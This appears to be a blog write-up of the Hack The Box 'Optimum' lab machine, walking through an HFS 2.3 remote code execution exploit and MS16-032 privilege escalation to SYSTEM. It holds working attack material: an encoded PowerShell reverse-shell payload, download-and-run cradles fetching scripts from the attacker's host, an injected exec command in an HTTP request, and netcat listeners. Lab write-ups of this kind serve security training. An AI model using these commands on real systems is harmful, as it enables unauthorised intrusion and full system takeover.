+++
draft = false
date = 2021-07-10T09:32:02+01:00
title = "Optimum"
description = ""
slug = ""
tags = []
categories = []
externalLink = ""
series = []
weight = 12
+++

# Machine info

- OS : Windows
- Difficulty : Easy
- Points : 20
- IP : 10.10.10.8

# Mind Map

![Optimum_MindMap](/images/htb/optimum_mindmap.png)

&nbsp;

# Recon

Let's see the `nmap` scan result:

```
Nmap scan report for 10.10.10.8
Host is up, received user-set (0.058s latency).
Scanned at 2021-07-10 09:35:20 CEST for 471s
Not shown: 65534 filtered ports
Reason: 65534 no-responses
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
|_http-title: HFS /
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012 (90%)
OS CPE: cpe:/o:microsoft:windows_server_2012
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2012 (90%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (90%), Microsoft Windows Server 2012 R2 (90%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=7/10%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=60E94F8F%P=x86_64-pc-linux-gnu)
SEQ(SP=FF%GCD=3%ISR=10C%TS=7)
OPS(O1=M54BNW8ST11%O2=M54BNW8ST11%O3=M54BNW8NNT11%O4=M54BNW8ST11%O5=M54BNW8ST11%O6=M54BST11)
WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)
ECN(R=Y%DF=Y%TG=80%W=2000%O=M54BNW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Uptime guess: 0.006 days (since Sat Jul 10 09:34:13 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: Busy server or unknown class
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   55.60 ms 10.10.16.1
2   55.63 ms 10.10.10.8
```

The only open port is the `80`.


&nbsp;

# Enumeration

Visiting port `80` we are presented with a web page about an HFS Http File Server.

![Legacy_MindMap](/images/htb/legacy_mindmap.png)

It is easy to identify its version, which appears to be the `2.3`.

Searching on the web informations about that version, we can identify an RCE exploit available
-> <https://www.exploit-db.com/exploits/49584>

We just need to change our attacking IP and port where we want to receive the reverse shell.


&nbsp;

# Exploitation

Launching the exploit:

```
$ python3 rce_http_file_server.py   

Encoded the command in base64 format...

Encoded the payload and sent a HTTP GET request to the target...

Printing some information for debugging...
lhost:  10.10.16.209
lport:  8989
rhost:  10.10.10.8
rport:  80
payload:  exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMgAwADkAIgAsADgAOQA4ADkAKQA7ACAAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAIABbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7ACAAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsADAALAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAgACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAJABpACkAOwAgACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABHAGUAdAAtAEwAbwBjAGEAdABpAG8AbgApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACAAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACAAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA

Listening for connection...
listening on [any] 8989 ...
connect to [10.10.16.209] from (UNKNOWN) [10.10.10.8] 49158
```

We will receive the connection back. We can see we are now logged in as the `kostas` user.

```
$ nc -nlvp 8989
listening on [any] 8989 ...
connect to [10.10.16.209] from (UNKNOWN) [10.10.10.8] 49167
whoami
optimum\kostas
PS C:\Users\kostas\Desktop> 
```

&nbsp;

# Privilege Escalation

Now that we have a basic shell on the target, we can start identifying paths to gain SYSTEM privileges. Watson can be a good choice to proceeed, but as this machine is very old, we will use Sherlock, its predecessor.

First of all we have to define in the script what functions we want to call. For that, we will add `Find-AllVulns` at the bottom of the script.

We can then share the script via a Python server and launch it on the target machine:

```
$ sudo python3 -m http.server 8888                                                   
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.10.10.8 - - [10/Jul/2021 11:20:06] "GET /Sherlock.ps1 HTTP/1.1" 200 - 
```

On target machine:

```
PS C:\Users\kostas\Desktop> IEX(New-Object Net.WebClient).downloadstring('http://10.10.16.209:8888/Sherlock.ps1')


Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Not Vulnerable

Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Not Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034?
VulnStatus : Appears Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135
VulnStatus : Appears Vulnerable

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html
VulnStatus : Not Vulnerable
```

From the output, the machine appears to be vulnerable to `MS16-032`, `MS16-034`, `MS16-135`.

Online we can find different exploits for `MS16-032`, but most of them will not work as we do not have a fully interactive shell on the target. In order to have a working script and exploit, we must use the one that comes with the Empire project.

<https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1>

**Note**: The exploit we will try to execute is intended for `64bit` machines. Our current shell runs on a `32bit` process probably becuse the HFS server is a `32bit` process, so first we have to obtain a valid `64bit` shell.

To check the environment, we can use the following command:

```
PS C:\Users\kostas\Desktop> [Environment]::Is64BitProcess
False
```

A valid resource that explains the concept is here -> <https://ss64.com/nt/syntax-64bit.html>


So, in order to obtain a `64bit` shell, we will call the PS executable from `sysNative` and issue the following request via Burp:

```
GET /?search=%00{.exec|C%3a\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.16.209:8000/rev.ps1').} HTTP/1.1

Host: 10.10.10.8

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Referer: http://10.10.10.8/

Cookie: HFS_SID=0.38337916159071

Upgrade-Insecure-Requests: 1
```

Where the `rev.ps1` file is the Powershell script from the Nishang project named `Invoke-PowerShellTcp.ps1` that contains the following instruction at its bottom:

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.209 -Port 8765
```

We will also set up a Python server, that will serve the Powershell file:

```
$ sudo python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.8 - - [10/Jul/2021 13:21:58] "GET /rev.ps1 HTTP/1.1" 200 -
```

Finally we get our `64bit` shell:

```
$ nc -nlvp 8765                                                                         1 ⨯
listening on [any] 8765 ...
connect to [10.10.16.209] from (UNKNOWN) [10.10.10.8] 49180
Windows PowerShell running as user kostas on OPTIMUM
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\kostas\Desktop> [Environment]::Is64BitProcess
True
```

Now we can proceed with our SYSTEM exploit.

We will use the `Invoke-MS16-032.ps1` exploit script from the Empire project and the `rev.ps1` script again. The first one is the actual exploit file, where we can specify what action or command we want to achieve. The second one is the shell we want to obtain, that in this case will be a SYSTEM one.

This time, we will replace the instruction at the bottom of `rev.ps1` in order to specify the port where we want our SYSTEM reverse shell:


```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.209 -Port 5678
```

With our Python server still running on port `8000`, we will use the following PS cradle from the target machine:

```
PS C:\Users\kostas\Desktop> IEX(New-Object Net.WebClient).downloadstring('http://10.10.16.209:8000/Invoke-MS16-032.ps1')
     __ __ ___ ___   ___     ___ ___ ___ 
    |  V  |  _|_  | |  _|___|   |_  |_  |
    |     |_  |_| |_| . |___| | |_  |  _|
    |_|_|_|___|_____|___|   |___|___|___|
                                        
                   [by b33f -> @FuzzySec]

[!] Holy handle leak Batman, we have a SYSTEM shell!!
```

The exploit script will be executed and it will call the `rev.ps1` script, that will get us the SYSTEM reverse shell on port `5678`:

```
$ nc -nlvp 5678
listening on [any] 5678 ...
connect to [10.10.16.209] from (UNKNOWN) [10.10.10.8] 49186
Windows PowerShell running as user SYSTEM on OPTIMUM
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\kostas\Desktop>whoami
nt authority\system
```


**Note**: flags are under `C:\Users\kostas\Desktop` and `C:\Users\Administrator\Desktop`.
